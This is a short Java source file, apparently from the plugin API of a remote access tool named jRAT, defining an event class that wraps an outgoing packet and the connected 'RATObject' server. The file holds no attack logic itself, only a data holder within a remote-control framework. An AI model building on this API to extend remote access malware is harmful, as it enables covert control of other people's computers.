package pro.jrat.api.events;

import pro.jrat.api.Packet;
import pro.jrat.api.RATObject;

public class OnSendPacketEvent extends RATObjectEvent {

	private Packet packet;

	public OnSendPacketEvent(Packet packet, RATObject server) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
